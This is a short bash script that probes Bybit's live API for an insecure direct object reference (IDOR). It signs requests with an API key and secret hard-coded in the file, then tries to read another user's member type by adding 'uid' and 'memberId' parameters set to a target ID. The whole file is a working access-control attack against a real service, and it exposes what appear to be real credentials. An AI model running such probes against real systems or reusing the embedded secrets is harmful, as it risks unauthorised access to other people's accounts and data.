#!/bin/bash
# IDOR CHECK ON OPEN ENDPOINTS
# Target: /v5/user/get-member-type

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE="https://api.bybit.com"
TARGET_UID="12345678"

# Sync Time
SERVER_TIME=$(curl -s "$BASE/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4)
OFFSET=$((SERVER_TIME - $(date +%s)))

sign() {
    local p=$1
    local t=$(($(date +%s) + OFFSET))000
    local s=$(echo -n "${t}${API_KEY}5000${p}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    echo "$t|$s"
}

call_get() {
    local ep=$1
    local params=$2
    
    IFS='|' read -r ts sig <<< $(sign "$params")
    
    # For GET, params must be in URL, and signature covers them
    url="$BASE$ep?$params"
    
    echo "-> GET $ep"
    resp=$(curl -s -X GET "$url" \
        -H "X-BAPI-API-KEY: $API_KEY" \
        -H "X-BAPI-SIGN: $sig" \
        -H "X-BAPI-SIGN-TYPE: 2" \
        -H "X-BAPI-TIMESTAMP: $ts" \
        -H "X-BAPI-RECV-WINDOW: 5000")
        
    echo "   $resp"
}

echo "=== IDOR CHECK ==="

# 1. Normal check
call_get "/v5/user/get-member-type" ""

# 2. IDOR Attempt: Add 'uid' param
# Does it allow querying another user's member type?
call_get "/v5/user/get-member-type" "uid=$TARGET_UID"
call_get "/v5/user/get-member-type" "memberId=$TARGET_UID"

# 3. Account Info (Fixed GET)
call_get "/v5/account/info" ""

echo "=== DONE ==="
